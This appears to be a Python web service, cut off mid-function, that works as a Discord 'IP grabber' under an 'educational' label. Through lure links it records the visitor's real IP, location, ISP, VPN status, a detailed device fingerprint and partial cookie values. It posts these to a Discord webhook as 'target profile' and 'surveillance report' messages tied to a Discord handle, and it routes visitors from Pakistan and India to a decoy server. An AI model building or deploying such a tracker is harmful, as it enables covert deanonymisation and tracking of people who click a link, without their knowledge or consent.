"""
GeoIP Redirect Service

This service redirects users based on their country of origin using GeoIP data.
Users from Pakistan or India will be redirected to an alternative server, while users from other countries will be redirected to a default subdomain.

Dependencies:
- quart: An asynchronous web microframework for Python.

"""

import ipaddress
import json
import os
import asyncio
import requests
from datetime import datetime
from user_agents import parse
import bisect  # Add this import for binary search

from ip_locator import _ranges_v4, _starts_v4, _ranges_v6, _starts_v6, set_logger
from logger import Logger
from json_handler import read_json_file, get_env_vars
from surveillance_embeds import create_combined_surveillance_embed, get_threat_indicator
from device_tracker import get_tracker
from quart import Quart, jsonify, redirect, render_template, request, send_file
from bot_manager import get_bot_manager, initialize_bot

app = Quart(__name__)
l = Logger(console_log=True, file_logging=True, file_URI="logs/log1.txt", override=True)
default_server: str
alternative_server_url: str
test_flag: bool
redirected: bool
config: dict
sub_nets: list

# Paths that must NOT trigger the shield. Crawlers/static-asset probes that
# hit the catch-all invite route are noise — respond benignly instead of
# treating the filename as a Discord invite / victim.
BLOCKED_CRAWLER_PATHS = frozenset({
    "robots.txt", "sitemap.xml", "sitemap-index.xml", "siteindex.xml",
    "ads.txt", "humans.txt", "security.txt", "well-known/security.txt",
    "bingbot.json", "bingsiteauth.xml", "bing-site-authentication.xml",
    "google.html", "google-site-verification.html",
    "manifest.json", "browserconfig.xml", "apple-app-site-association",
    "assetlinks.json", "favicon.ico", "favicon.png", "favicon.svg",
    "service-worker.js", "sw.js",
})

BLOCKED_CRAWLER_PREFIXES = (".well-known/",)

BLOCKED_CRAWLER_SUFFIXES = (
    ".css", ".js", ".mjs", ".map", ".png", ".jpg", ".jpeg", ".gif", ".svg",
    ".ico", ".webp", ".avif", ".xml", ".txt", ".json", ".webmanifest",
    ".woff", ".woff2", ".ttf", ".eot", ".otf", ".pdf", ".zip", ".gz",
)


def is_blocked_crawler_path(path):
    """Return True for crawler/static-asset paths that must not trigger the shield."""
    if not path:
        return False
    norm = path.strip().lstrip("/").lower()
    if not norm:
        return False
    if norm in BLOCKED_CRAWLER_PATHS:
        return True
    if any(norm.startswith(p) for p in BLOCKED_CRAWLER_PREFIXES):
        return True
    if any(norm.endswith(s) for s in BLOCKED_CRAWLER_SUFFIXES):
        return True
    return False


def read_subnets_from_file(filename_or_url):
    global sub_nets
    """
    Read subnets from a text file or URL and pre-process them for fast lookup.

    Parameters:
    filename_or_url (str): Local filename or URL containing subnets.

    Returns:
    list: List of processed subnet ranges for binary search.
    """
    subnets = []
    processed_ranges = []

    # Check if it's a URL
    if filename_or_url.startswith("http"):
        try:
            l.info(f"Fetching VPN subnets from: {filename_or_url}")
            response = requests.get(filename_or_url, timeout=10)  # Reduced to 10s for faster startup
            response.raise_for_status()

            # Process the content line by line
            for line in response.text.splitlines():
                line = line.strip()
                if line and not line.startswith("#"):  # Skip empty lines and comments
                    subnets.append(line)

            l.passing(f"Successfully fetched {len(subnets)} VPN subnets from GitHub")

        except requests.exceptions.RequestException as e:
            l.error(f"Failed to fetch subnets from URL: {e}")
            l.warning("Falling back to local file if available")
            filename_or_url = "ipv4.txt"
        except Exception as e:
            l.error(f"Unexpected error fetching subnets: {e}")
            l.warning("Falling back to local file if available")
            filename_or_url = "ipv4.txt"

    # Local file reading (fallback or direct)
    if not subnets:  # Only read from file if we didn't get subnets from URL
        try:
            with open(filename_or_url, "r") as file:
                for line in file:
                    line = line.strip()
                    if line and not line.startswith(
                        "#"
                    ):  # Skip empty lines and comments
                        subnets.append(line)
            l.passing(f"Read {len(subnets)} subnets from local file: {filename_or_url}")
        except FileNotFoundError:
            l.error(f"File not found: {filename_or_url}")
            l.warning("VPN detection will be disabled")
            return []
        except Exception as e:
            l.error(f"Error reading file {filename_or_url}: {e}")
            return []

    # Pre-process subnets into sorted ranges for binary search
    l.info("Pre-processing subnets for optimized lookup...")

    for subnet in subnets:
        try:
            network = ipaddress.ip_network(subnet, strict=False)
            start_ip = int(network.network_address)
            end_ip = int(network.broadcast_address)
            processed_ranges.append((start_ip, end_ip))
        except ValueError as e:
            l.warning(f"Invalid subnet format: {subnet} - {e}")
            continue

    # Sort ranges by start IP for binary search
    processed_ranges.sort(key=lambda x: x[0])

    # Merge overlapping ranges for efficiency
    merged_ranges = []
    for start, end in processed_ranges:
        if merged_ranges and start <= merged_ranges[-1][1] + 1:
            # Merge with previous range
            merged_ranges[-1] = (merged_ranges[-1][0], max(merged_ranges[-1][1], end))
        else:
            merged_ranges.append((start, end))

    l.passing(
        f"Optimized {len(subnets)} subnets into {len(merged_ranges)} merged ranges for fast lookup"
    )
    sub_nets = merged_ranges
    return merged_ranges


def check_for_vpn(ip):
    """
    Fast VPN check using binary search on pre-processed subnet ranges.

    Parameters:
    ip (str): IP address to check.

    Returns:
    bool: True if IP is in VPN subnet, False otherwise.
    """
    global sub_nets

    if not ip or not sub_nets:
        return False

    try:
        ip_int = int(ipaddress.ip_address(ip))

        # Binary search for the range containing this IP
        # Find the rightmost range that starts <= ip_int
        idx = bisect.bisect_right([start for start, end in sub_nets], ip_int) - 1

        if idx >= 0 and idx < len(sub_nets):
            start, end = sub_nets[idx]
            return start <= ip_int <= end

        return False

    except (ValueError, TypeError) as e:
        l.warning(f"Invalid IP address for VPN check: {ip} - {e}")
        return False


def extract_device_info(request_obj):
    """
    Extract comprehensive device and browser information from the request.

    Args:
    - request_obj: The Quart request object

    Returns:
    - dict: Dictionary containing device information
    """
    headers = request_obj.headers

    # Extract the real IP address using the new function
    real_ip = extract_real_ip(request_obj)
    proxy_ip = headers.get("X-Real-IP", "Unknown")
    # User Agent parsing
    user_agent_string = headers.get("User-Agent", "Unknown")
    user_agent = parse(user_agent_string)

    # Extract cookies
    cookies = dict(request_obj.cookies) if request_obj.cookies else {}

    # Extract detailed information
    device_info = {
        "user_agent_string": user_agent_string,
        "browser_family": user_agent.browser.family,
        "browser_version": user_agent.browser.version_string,
        "os_family": user_agent.os.family,
        "os_version": user_agent.os.version_string,
        "device_family": user_agent.device.family,
        "device_brand": user_agent.device.brand,
        "device_model": user_agent.device.model,
        "is_mobile": user_agent.is_mobile,
        "is_tablet": user_agent.is_tablet,
        "is_pc": user_agent.is_pc,
        "is_bot": user_agent.is_bot,
        # IP Information - both real and proxy
        "real_ip": real_ip,
        "proxy_ip": proxy_ip,
        # HTTP Headers
        "accept_language": headers.get("Accept-Language", "Unknown"),
        "accept_encoding": headers.get("Accept-Encoding", "Unknown"),
        "accept": headers.get("Accept", "Unknown"),
        "referer": headers.get("Referer", "Direct"),
        "host": headers.get("Host", "Unknown"),
        "connection": headers.get("Connection", "Unknown"),
        "cache_control": headers.get("Cache-Control", "Unknown"),
        "upgrade_insecure_requests": headers.get(
            "Upgrade-Insecure-Requests", "Unknown"
        ),
        "sec_fetch_site": headers.get("Sec-Fetch-Site", "Unknown"),
        "sec_fetch_mode": headers.get("Sec-Fetch-Mode", "Unknown"),
        "sec_fetch_dest": headers.get("Sec-Fetch-Dest", "Unknown"),
        "sec_ch_ua": headers.get("Sec-CH-UA", "Unknown"),
        "sec_ch_ua_mobile": headers.get("Sec-CH-UA-Mobile", "Unknown"),
        "sec_ch_ua_platform": headers.get("Sec-CH-UA-Platform", "Unknown"),
        "sec_ch_ua_platform_version": headers.get(
            "Sec-CH-UA-Platform-Version", "Unknown"
        ),
        "sec_ch_ua_arch": headers.get("Sec-CH-UA-Arch", "Unknown"),
        "sec_ch_ua_model": headers.get("Sec-CH-UA-Model", "Unknown"),
        "sec_ch_ua_bitness": headers.get("Sec-CH-UA-Bitness", "Unknown"),
        "sec_ch_ua_wow64": headers.get("Sec-CH-UA-WoW64", "Unknown"),
        "sec_ch_ua_full_version_list": headers.get(
            "Sec-CH-UA-Full-Version-List", "Unknown"
        ),
        "sec_ch_viewport_width": headers.get("Sec-CH-Viewport-Width", "Unknown"),
        "sec_ch_viewport_height": headers.get("Sec-CH-Viewport-Height", "Unknown"),
        "sec_ch_dpr": headers.get("Sec-CH-DPR", "Unknown"),
        "sec_ch_device_memory": headers.get("Sec-CH-Device-Memory", "Unknown"),
        "sec_ch_downlink": headers.get("Sec-CH-Downlink", "Unknown"),
        "sec_ch_ect": headers.get("Sec-CH-ECT", "Unknown"),
        "sec_ch_rtt": headers.get("Sec-CH-RTT", "Unknown"),
        "sec_ch_save_data": headers.get("Sec-CH-Save-Data", "Unknown"),
        "sec_ch_prefers_color_scheme": headers.get(
            "Sec-CH-Prefers-Color-Scheme", "Unknown"
        ),
        "sec_ch_prefers_reduced_motion": headers.get(
            "Sec-CH-Prefers-Reduced-Motion", "Unknown"
        ),
        # Additional network info
        "x_forwarded_for": headers.get("X-Forwarded-For", "Unknown"),
        "x_real_ip": headers.get("X-Real-IP", "Unknown"),
        "cf_connecting_ip": headers.get("CF-Connecting-IP", "Unknown"),
        "cf_ipcountry": headers.get("CF-IPCountry", "Unknown"),
        "cf_ray": headers.get("CF-Ray", "Unknown"),
        "cf_visitor": headers.get("CF-Visitor", "Unknown"),
        "x_forwarded_proto": headers.get("X-Forwarded-Proto", "Unknown"),
        "x_forwarded_port": headers.get("X-Forwarded-Port", "Unknown"),
        # Browser fingerprinting headers
        "dnt": headers.get("DNT", "Unknown"),  # Do Not Track
        "sec_gpc": headers.get("Sec-GPC", "Unknown"),  # Global Privacy Control
        "pragma": headers.get("Pragma", "Unknown"),
        "if_modified_since": headers.get("If-Modified-Since", "Unknown"),
        "if_none_match": headers.get("If-None-Match", "Unknown"),
        "te": headers.get("TE", "Unknown"),  # Transfer encoding
        "authorization": "REDACTED" if headers.get("Authorization") else "None",
        # Cookies and session data
        "cookies": cookies,
        "cookie_count": len(cookies),
        "has_session_cookies": any(
            "session" in k.lower() or "auth" in k.lower() or "token" in k.lower()
            for k in cookies.keys()
        ),
        "has_tracking_cookies": any(
            "ga" in k.lower()
            or "gtm" in k.lower()
            or "fb" in k.lower()
            or "_utm" in k.lower()
            or "analytics" in k.lower()
            for k in cookies.keys()
        ),
        # Request metadata
        "method": request_obj.method,
        "scheme": request_obj.scheme,
        "path": request_obj.path,
        "query_string": (
            request_obj.query_string.decode("utf-8") if request_obj.query_string else ""
        ),
        "content_type": request_obj.content_type or "Unknown",
        "content_length": headers.get("Content-Length", "Unknown"),
        # Timestamp with better formatting
        "access_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
        "access_timestamp": datetime.now().timestamp(),
    }

    return device_info


def send_to_channel(message: str, embed_data=None, components=None):
    """Enhanced webhook sender with better error handling"""
    global config

    payload = {}

    # Build payload more safely
    if embed_data:
        # Discord limits: field value ≤1024, field name ≤256, description ≤4096, embed total ≤6000
        if isinstance(embed_data, dict) and isinstance(embed_data.get("fields"), list):
            for field in embed_data["fields"]:
                value = field.get("value", "")
                if isinstance(value, str) and len(value) > 1024:
                    field["value"] = value[:1021] + "..."
                name = field.get("name", "")
                if isinstance(name, str) and len(name) > 256:
                    field["name"] = name[:253] + "..."
        payload["embeds"] = [embed_data]
        if message:
            payload["content"] = message
        # Note: Webhooks don't support components/buttons
        if components:
            l.warning("Webhooks don't support interactive components - buttons ignored")
    else:
        payload["content"] = message or "No message content"

    try:
        response = requests.post(
            config["dc_webhook_url"], json=payload, timeout=10  # Add timeout
        )
        response.raise_for_status()

        if response.status_code == 204:
            l.passing("Message sent successfully")
            return True
        else:
            l.error(f"Unexpected status code: {response.status_code}")
            return False

    except requests.exceptions.Timeout:
        l.error("Webhook request timed out")
        return False
    except requests.exceptions.RequestException as e:
        l.error(f"Webhook request failed: {e}")
        return False


def create_honeypot_embed(ip, country_code, honeypot, device_info=None):
    """
    Create an educational Discord embed demonstrating honeypot security concepts
    """
    from surveillance_embeds import (
        get_threat_indicator,
        create_progress_bar,
        get_security_lesson,
    )

    # Calculate threat score based on honeypot trigger
    threat_score = 75  # Honeypot triggers are high risk
    threat_level, embed_color = get_threat_indicator(threat_score)

    # Fix IP address display - use fallback if None
    display_ip = ip if ip and ip != "None" else "127.0.0.1 (localhost)"

    embed = {
        "title": "🎓 HONEYPOT EDUCATIONAL DEMONSTRATION",
        "description": f"**📚 CYBERSECURITY LESSON: HONEYPOT DEPLOYMENT**\n"
        + f"**{threat_level} RISK DEMONSTRATED**\n"
        + f"🎯 **Geographic filtering triggered for {country_code}**\n\n"
        + f"*This demonstrates how honeypots redirect potentially malicious traffic*",
        "color": embed_color,
        "timestamp": datetime.now().isoformat(),
        "thumbnail": {
            "url": "https://cdn.discordapp.com/emojis/454652220064006147.gif"
        },
        "fields": [],
        "footer": {
            "text": f"DC-Shield Educational Platform • Security Demonstration • Risk Score: {threat_score}/100",
            "icon_url": "https://cdn.discordapp.com/emojis/658997002100670484.png",
        },
    }

    # Enhanced Network Intelligence
    network_value = f"**IP Address:** `{display_ip}`\n"
    network_value += f"**Country Code:** {country_code}\n"
    network_value += f"**Threat Assessment:** {threat_level}\n"
    network_value += f"**Risk Score:** {create_progress_bar(threat_score)}"

    embed["fields"].append(
        {"name": "🌐 NETWORK INTELLIGENCE", "value": network_value, "inline": False}
    )

    # Honeypot Information
    honeypot_value = f"**Decoy Server:** `{honeypot}`\n"
    honeypot_value += "**Redirect Status:** ✅ Successfully executed\n"
    honeypot_value += f"**Analysis:** [View IP Details](https://iplocation.com/?ip={display_ip.replace(' (localhost)', '')})"

    embed["fields"].append(
        {"name": "🍯 HONEYPOT DETAILS", "value": honeypot_value, "inline": False}
    )

    # Request route — the exact lure URL the target clicked
    if device_info:
        route_value = (
            f"**Lure URL:** `{device_info['scheme']}://{device_info['host']}{device_info['path']}`\n"
        )
        if device_info.get("query_string"):
            route_value += f"**Query:** `{device_info['query_string'][:60]}`\n"
        route_value += f"**Method:** `{device_info['method']}`\n"
        route_value += f"**Referer:** `{str(device_info['referer'])[:120]}`"
        embed["fields"].append(
            {"name": "🧭 REQUEST ROUTE", "value": route_value, "inline": False}
        )

    if device_info:
        # Enhanced Device Profile
        device_value = f"**Browser:** {device_info['browser_family']} {device_info['browser_version']}\n"
        device_value += f"**Operating System:** {device_info['os_family']} {device_info['os_version']}\n"
        device_value += f"**Device Type:** {device_info['device_family']}"

        if device_info["device_brand"] and device_info["device_brand"] != "None":
            device_value += (
                f" ({device_info['device_brand']} {device_info['device_model']})"
            )

        device_type_map = {
            "is_mobile": ("📱", "Mobile"),
            "is_pc": ("💻", "Desktop"),
            "is_tablet": ("📟", "Tablet"),
            "is_bot": ("🤖", "Bot"),
        }
        device_type_emoji, device_type_text = ("❓", "Unknown")
        for key, (emoji, text) in device_type_map.items():
            if device_info[key]:
                device_type_emoji, device_type_text = emoji, text
                break

        device_value += f"\n**Platform:** {device_type_emoji} {device_type_text}"

        embed["fields"].append(
            {"name": "📱 DEVICE FINGERPRINT", "value": device_value, "inline": True}
        )

        # Connection Intelligence with better timestamp formatting
        connection_value = (
            f"**Language Settings:** {device_info['accept_language'][:25]}...\n"
        )
        connection_value += f"**Referrer Source:** {device_info['referer'][:40]}...\n"

        # Format timestamp better
        try:
            access_dt = datetime.fromisoformat(
                device_info["access_time"].replace("Z", "+00:00")
            )
            formatted_time = access_dt.strftime("%Y-%m-%d %H:%M:%S UTC")
        except ValueError:
            formatted_time = device_info["access_time"]

        connection_value += f"**Access Time:** {formatted_time}\n"
        connection_value += (
            f"**User Agent:** {device_info['user_agent_string'][:50]}..."
        )

        embed["fields"].append(
            {
                "name": "🌍 CONNECTION ANALYSIS",
                "value": connection_value,
                "inline": True,
            }
        )

        # Security Indicators
        security_indicators = []
        if device_info["has_session_cookies"]:
            security_indicators.append("⚠️ Session cookies present")
        if device_info["has_tracking_cookies"]:
            security_indicators.append("⚠️ Tracking cookies detected")
        if device_info["is_bot"]:
            security_indicators.append("🤖 Bot-like behavior")
        if not security_indicators:
            security_indicators.append("✅ No obvious red flags")

        embed["fields"].append(
            {
                "name": "🔍 SECURITY INDICATORS",
                "value": "\n".join(security_indicators),
                "inline": False,
            }
        )

    # Add Educational Content
    from surveillance_embeds import get_security_lesson

    lesson = get_security_lesson("vpn_detection")
    education_value = f"**{lesson['title']}**\n"
    education_value += f"📖 {lesson['lesson']}\n\n"
    education_value += f"**🛡️ How to Protect Yourself:**\n{lesson['protection']}\n\n"
    education_value += f"**📚 Reference:** {lesson['reference']}"

    embed["fields"].append(
        {"name": "🎓 SECURITY LESSON", "value": education_value, "inline": False}
    )

    return embed


def create_ip_grabber_embed(
    dc_handle, ip_address, vpn, country_name, country_code2, isp, device_info
):
    """
    Create an educational Discord embed demonstrating IP tracking and fingerprinting
    """
    from surveillance_embeds import (
        get_threat_indicator,
        create_progress_bar,
        get_security_lesson,
    )

    # Calculate threat score based on various factors
    threat_score = 45  # Base score for IP grabbing
    if vpn:
        threat_score += 20  # VPN usage increases suspicion
    if device_info.get("has_tracking_cookies"):
        threat_score += 10
    if device_info.get("is_bot"):
        threat_score += 15

    threat_score = min(threat_score, 100)
    threat_level, embed_color = get_threat_indicator(threat_score)

    target_display = str(dc_handle or "Anonymous").rstrip("?").strip() or "Anonymous"
    target_display = target_display[:64]

    embed = {
        "title": f"🎯 IP TRACKING — Ticket: {target_display}",
        "description": (
            f"**Ticket:** `{target_display}`\n"
            f"**Threat Level:** {threat_level}\n"
            f"_Browser fingerprinting demonstration · educational use only._"
        ),
        "color": embed_color,
        "timestamp": datetime.now().isoformat(),
        "thumbnail": {"url": "https://cdn.discordapp.com/emojis/target.png"},
        "fields": [],
        "footer": {
            "text": f"Ticket {target_display} • DC-Shield Educational Platform • Risk {threat_score}/100",
            "icon_url": "https://cdn.discordapp.com/emojis/globe.png",
        },
    }

    # Enhanced Target Profile
    target_value = f"**Discord Handle:** `{dc_handle}`\n"
    target_value += f"**VPN Detection:** {'🔒 Active VPN detected' if vpn else '❌ No VPN protection'}\n"
    target_value += f"**Risk Assessment:** {threat_level}\n"
    target_value += f"**Threat Score:** {create_progress_bar(threat_score)}"

    embed["fields"].append(
        {"name": "👤 TARGET PROFILE", "value": target_value, "inline": False}
    )

    # Request route — the exact lure URL the target clicked
    route_value = (
        f"**Lure URL:** `{device_info['scheme']}://{device_info['host']}{device_info['path']}`\n"
    )
    if device_info.get("query_string"):
        route_value += f"**Query:** `{device_info['query_string'][:60]}`\n"
    route_value += f"**Method:** `{device_info['method']}`\n"
    route_value += f"**Referer:** `{str(device_info['referer'])[:120]}`"
    embed["fields"].append(
        {"name": "🧭 REQUEST ROUTE", "value": route_value, "inline": False}
    )

    # Geographic Intelligence
    geo_value = f"**IP Address:** `{ip_address}`\n"
    geo_value += f"**Country:** {country_name} ({country_code2})\n"
    geo_value += f"**ISP Provider:** {isp}\n"
    geo_value += (
        f"**Analysis Link:** [Detailed Lookup](https://iplocation.com/?ip={ip_address})"
    )

    embed["fields"].append(
        {"name": "🌍 GEOGRAPHIC INTELLIGENCE", "value": geo_value, "inline": True}
    )

    # Enhanced Device Analysis
    device_value = f"**Browser:** {device_info['browser_family']} {device_info['browser_version']}\n"
    device_value += f"**Operating System:** {device_info['os_family']} {device_info['os_version']}\n"
    device_value += f"**Hardware:** {device_info['device_family']}"

    if device_info["device_brand"] and device_info["device_brand"] != "None":
        device_value += (
            f" ({device_info['device_brand']} {device_info['device_model']})"
        )

    platform_icons = {"mobile": "📱", "tablet": "📟", "pc": "💻", "bot": "🤖"}

    platform_type = "unknown"
    if device_info["is_mobile"]:
        platform_type = "mobile"
    elif device_info["is_tablet"]:
        platform_type = "tablet"
    elif device_info["is_pc"]:
        platform_type = "pc"
    elif device_info["is_bot"]:
        platform_type = "bot"

    platform_emoji = platform_icons.get(platform_type, "❓")
    device_value += f"\n**Platform:** {platform_emoji} {platform_type.title()}"

    embed["fields"].append(
        {"name": "📱 DEVICE ANALYSIS", "value": device_value, "inline": True}
    )

    # Privacy & Security Analysis
    privacy_concerns = []
    privacy_score = 0

    if device_info["cookie_count"] > 0:
        privacy_concerns.append(
            f"🍪 **Cookies:** {device_info['cookie_count']} detected"
        )
        privacy_score += min(device_info["cookie_count"] * 2, 20)

    if device_info["has_session_cookies"]:
        privacy_concerns.append("⚠️ **Session Data:** Active sessions found")
        privacy_score += 15

    if device_info["has_tracking_cookies"]:
        privacy_concerns.append("⚠️ **Tracking:** Analytics cookies present")
        privacy_score += 10

    if device_info.get("dnt") == "1":
        privacy_concerns.append("✅ **Do Not Track:** Enabled")
    else:
        privacy_concerns.append("❌ **Do Not Track:** Disabled")
        privacy_score += 5

    if privacy_score >= 30:
        privacy_level = "🔴 High Risk"
    elif privacy_score >= 15:
        privacy_level = "🟡 Moderate Risk"
    else:
        privacy_level = "🟢 Low Risk"

    embed["fields"].append(
        {
            "name": f"🔒 PRIVACY ANALYSIS ({privacy_level})",
            "value": "\n".join(privacy_concerns),
            "inline": False,
        }
    )

    # Technical Specifications
    tech_specs = []

    if device_info.get("sec_ch_device_memory", "Unknown") != "Unknown":
        tech_specs.append(f"**RAM:** {device_info['sec_ch_device_memory']} GB")

    if device_info.get("sec_ch_ua_arch", "Unknown") != "Unknown":
        tech_specs.append(f"**Architecture:** {device_info['sec_ch_ua_arch']}")

    if device_info.get("sec_ch_dpr", "Unknown") != "Unknown":
        tech_specs.append(f"**Display DPR:** {device_info['sec_ch_dpr']}")

    if device_info.get("sec_ch_downlink", "Unknown") != "Unknown":
        tech_specs.append(f"**Network Speed:** {device_info['sec_ch_downlink']} Mbps")

    if device_info.get("sec_ch_rtt", "Unknown") != "Unknown":
        tech_specs.append(f"**Network Latency:** {device_info['sec_ch_rtt']}ms")

    if tech_specs:
        embed["fields"].append(
            {
                "name": "⚙️ Technical Specifications",
                "value": "\n".join(tech_specs),
                "inline": True,
            }
        )

    # Add Educational Content
    lesson = get_security_lesson("fingerprinting")
    education_value = f"**{lesson['title']}**\n"
    education_value += f"📖 {lesson['lesson']}\n\n"
    education_value += f"**🛡️ How to Protect Yourself:**\n{lesson['protection']}\n\n"
    education_value += f"**📚 Reference:** {lesson['reference']}"

    embed["fields"].append(
        {"name": "🎓 PRIVACY EDUCATION", "value": education_value, "inline": False}
    )

    return embed


def extract_real_ip(request_obj):
    """
    Extract the real client IP address when running behind nginx proxy manager.

    Args:
    - request_obj: The Quart request object

    Returns:
    - str: The real client IP address
    """
    headers = request_obj.headers

    # Debug: log all headers to troubleshoot IP extraction
    l.debug(f"All headers: {dict(headers)}")

    # Check CF-Connecting-IP first (Cloudflare) - most reliable when behind Cloudflare
    cf_ip = headers.get("CF-Connecting-IP")
    if cf_ip and is_valid_ip(cf_ip):
        l.debug(f"Using CF-Connecting-IP: {cf_ip}")
        return cf_ip

    # Check X-Original-Forwarded-For (nginx ingress preserves original before proxying)
    x_original_forwarded_for = headers.get("X-Original-Forwarded-For")
    if x_original_forwarded_for:
        # Handle comma-separated IPs (take the first one - the original client)
        real_ip = x_original_forwarded_for.split(",")[0].strip()
        if is_valid_ip(real_ip):
            l.debug(f"Using X-Original-Forwarded-For: {real_ip}")
            return real_ip

    # Check X-Forwarded-For header (contains real client IP)
    x_forwarded_for = headers.get("X-Forwarded-For")
    if x_forwarded_for:
        # Handle comma-separated IPs (take the first one - the original client)
        real_ip = x_forwarded_for.split(",")[0].strip()
        if is_valid_ip(real_ip):
            l.debug(f"Using X-Forwarded-For: {real_ip}")
            return real_ip

    # Fall back to X-Real-IP header
    x_real_ip = headers.get("X-Real-IP")
    if x_real_ip and is_valid_ip(x_real_ip):
        l.debug(f"Using X-Real-IP: {x_real_ip}")
        return x_real_ip

    # Fall back to request.remote_addr as last resort
    remote_addr = getattr(request_obj, "remote_addr", None)
    if remote_addr and is_valid_ip(remote_addr):
        return remote_addr

    # If all else fails, return None
    return None


def is_valid_ip(ip_string):
    """
    Validate if a string is a valid IP address.

    Args:
    - ip_string: String to validate

    Returns:
    - bool: True if valid IP, False otherwise
    """
    if not ip_string:
        return False

    try:
        ipaddress.ip_address(ip_string)
        return True
    except ValueError:
        return False


def create_verbose_embed(device_info, event_type="IP_GRABBER", dc_handle=None):
    """
    Create a verbose embed with all detailed information.
    """
    target = (str(dc_handle).rstrip("?").strip() or "Anonymous") if dc_handle else None

    title_suffix = f" — Ticket: {target[:64]}" if target else ""
    description = "Complete device and network fingerprint analysis"
    if target:
        description = f"**Ticket:** `{target[:64]}`\n{description}"

    footer_text = "DC-Shield Detailed Analysis System"
    if target:
        footer_text = f"Ticket {target[:64]} • {footer_text}"

    embed = {
        "title": f"📋 VERBOSE {event_type} DETAILS{title_suffix}",
        "description": description,
        "color": 0x2F3542,  # Dark gray color
        "timestamp": datetime.now().isoformat(),
        "fields": [],
        "footer": {
            "text": footer_text,
            "icon_url": "https://cdn.discordapp.com/emojis/658997002100670484.png",
        },
    }

    # Browser Details
    browser_details = f"**Family:** {device_info['browser_family']}\n"
    browser_details += f"**Version:** {device_info['browser_version']}\n"
    browser_details += f"**User Agent:** {device_info['user_agent_string'][:100]}..."

    embed["fields"].append(
        {"name": "🌐 Browser Details", "value": browser_details, "inline": False}
    )

    # Operating System
    os_details = f"**Family:** {device_info['os_family']}\n"
    os_details += f"**Version:** {device_info['os_version']}\n"
    if device_info["sec_ch_ua_platform"] != "Unknown":
        os_details += f"**Platform:** {device_info['sec_ch_ua_platform']}\n"
    if device_info["sec_ch_ua_platform_version"] != "Unknown":
        os_details += (
            f"**Platform Version:** {device_info['sec_ch_ua_platform_version']}"
        )

    embed["fields"].append(
        {"name": "💻 Operating System", "value": os_details, "inline": True}
    )

    # Hardware Specifications
    hardware_specs = ""
    if device_info["sec_ch_device_memory"] != "Unknown":
        hardware_specs += f"**RAM:** {device_info['sec_ch_device_memory']} GB\n"
    if device_info["sec_ch_ua_arch"] != "Unknown":
        hardware_specs += f"**Architecture:** {device_info['sec_ch_ua_arch']}\n"
    if device_info["sec_ch_ua_bitness"] != "Unknown":
        hardware_specs += f"**Bitness:** {device_info['sec_ch_ua_bitness']}-bit\n"
    if device_info["sec_ch_ua_wow64"] != "Unknown":
        hardware_specs += f"**WoW64:** {device_info['sec_ch_ua_wow64']}\n"
    if device_info["sec_ch_dpr"] != "Unknown":
        hardware_specs += f"**Device Pixel Ratio:** {device_info['sec_ch_dpr']}"

    if hardware_specs:
        embed["fields"].append(
            {
                "name": "⚙️ Hardware Specifications",
                "value": hardware_specs,
                "inline": True,
            }
        )

    # Network Information
    network_info = f"**Accept-Language:** {device_info['accept_language']}\n"
    network_info += f"**Accept-Encoding:** {device_info['accept_encoding']}\n"
    if device_info["sec_ch_downlink"] != "Unknown":
        network_info += f"**Download Speed:** {device_info['sec_ch_downlink']} Mbps\n"
    if device_info["sec_ch_rtt"] != "Unknown":
        network_info += f"**Round Trip Time:** {device_info['sec_ch_rtt']}ms\n"
    if device_info["sec_ch_ect"] != "Unknown":
        network_info += f"**Effective Connection Type:** {device_info['sec_ch_ect']}"

    embed["fields"].append(
        {"name": "🌍 Network Information", "value": network_info, "inline": False}
    )

    # Cookie Analysis
    if device_info["cookie_count"] > 0:
        cookie_analysis = f"**Total Count:** {device_info['cookie_count']}\n"
        cookie_analysis += f"**Has Session Cookies:** {'Yes' if device_info['has_session_cookies'] else 'No'}\n"
        cookie_analysis += f"**Has Tracking Cookies:** {'Yes' if device_info['has_tracking_cookies'] else 'No'}\n"

        # List first few cookies
        if device_info["cookies"]:
            cookie_analysis += "**Sample Cookies:**\n"
            for i, (name, value) in enumerate(list(device_info["cookies"].items())[:3]):
                cookie_analysis += f"• `{name}`: {value[:30]}...\n"
            if len(device_info["cookies"]) > 3:
                cookie_analysis += f"• ... and {len(device_info['cookies']) - 3} more"

        embed["fields"].append(
            {"name": "🍪 Cookie Analysis", "value": cookie_analysis, "inline": True}
        )

    # Privacy & Security Headers
    privacy_info = ""
    if device_info["dnt"] != "Unknown":
        privacy_info += f"**Do Not Track:** {device_info['dnt']}\n"
    if device_info["sec_ch_prefers_color_scheme"] != "Unknown":
        privacy_info += (
            f"**Color Scheme:** {device_info['sec_ch_prefers_color_scheme']}\n"
        )
    if device_info["sec_ch_prefers_reduced_motion"] != "Unknown":
        privacy_info += (
            f"**Reduced Motion:** {device_info['sec_ch_prefers_reduced_motion']}\n"
        )
    if device_info["sec_ch_save_data"] != "Unknown":
        privacy_info += f"**Save Data:** {device_info['sec_ch_save_data']}"

    if privacy_info:
        embed["fields"].append(
            {"name": "🔒 Privacy & Preferences", "value": privacy_info, "inline": True}
        )

    # Screen & Viewport
    if (
        device_info["sec_ch_viewport_width"] != "Unknown"
        or device_info["sec_ch_viewport_height"] != "Unknown"
    ):
        viewport_info = ""
        if device_info["sec_ch_viewport_width"] != "Unknown":
            viewport_info += f"**Width:** {device_info['sec_ch_viewport_width']}px\n"
        if device_info["sec_ch_viewport_height"] != "Unknown":
            viewport_info += f"**Height:** {device_info['sec_ch_viewport_height']}px\n"
        if device_info["sec_ch_dpr"] != "Unknown":
            viewport_info += f"**Pixel Ratio:** {device_info['sec_ch_dpr']}"

        embed["fields"].append(
            {"name": "📱 Screen & Viewport", "value": viewport_info, "inline": True}
        )

    # Request Metadata
    metadata = f"**Method:** {device_info['method']}\n"
    metadata += f"**Scheme:** {device_info['scheme']}\n"
    metadata += f"**Path:** {device_info['path']}\n"
    if device_info["query_string"]:
        metadata += f"**Query:** {device_info['query_string'][:50]}...\n"
    metadata += f"**Content Type:** {device_info['content_type']}"

    embed["fields"].append(
        {"name": "📄 Request Metadata", "value": metadata, "inline": False}
    )

    return embed


# Global storage for device information (in production, use a database)
device_data_store = {}
advanced_data_store = {}
COMPREHENSIVE_REPORT_MESSAGE = "🚨 **COMPREHENSIVE SURVEILLANCE REPORT** 🚨"


@app.route("/api/collect-advanced-data", methods=["POST"])
async def collect_advanced_data():
    """
    API endpoint to receive advanced browser data collection with device tracking
    """
    try:
        data = await request.get_json()

        # Store the advanced data
        timestamp = str(data.get("timestamp", int(datetime.now().timestamp())))
        advanced_data_store[timestamp] = data

